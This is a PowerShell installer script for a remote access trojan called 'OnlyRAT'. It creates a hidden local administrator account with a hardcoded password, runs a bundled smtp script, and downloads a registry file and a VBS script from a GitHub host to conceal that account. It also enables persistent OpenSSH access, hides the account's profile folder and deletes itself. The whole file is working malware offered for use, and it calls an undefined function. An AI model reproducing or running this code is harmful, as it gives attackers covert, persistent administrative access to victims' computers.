# builds resources for rat
# created by : C0SM0

# random string for direcories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# creates local admin
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )    
    begin {
    }    
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }    
    end {
    }
}
$NewLocalAdmin = "onlyrat"
$Password = (ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# varaibles
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location


# create admin user
$uname = "onlyrat"
$pword = (ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force)
create_account -uname $uname -pword $pword

# goto temp, make working directory
mkdir $path
cd $path
mv $initial_dir/smtp.txt ./smtp.ps1
./smtp.ps1

# registry to hide local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/wrev.reg -OutFile "wrev.reg"

# visual basic script to register the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/calty.vbs -OutFile "calty.vbs"

# enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# install the registry
./wrev.reg; ./calty

# hide onlyrat user
cd C:\Users
attrib +h +s +r onlyrat 

# self delete
cd $initial_dir
del installer.ps1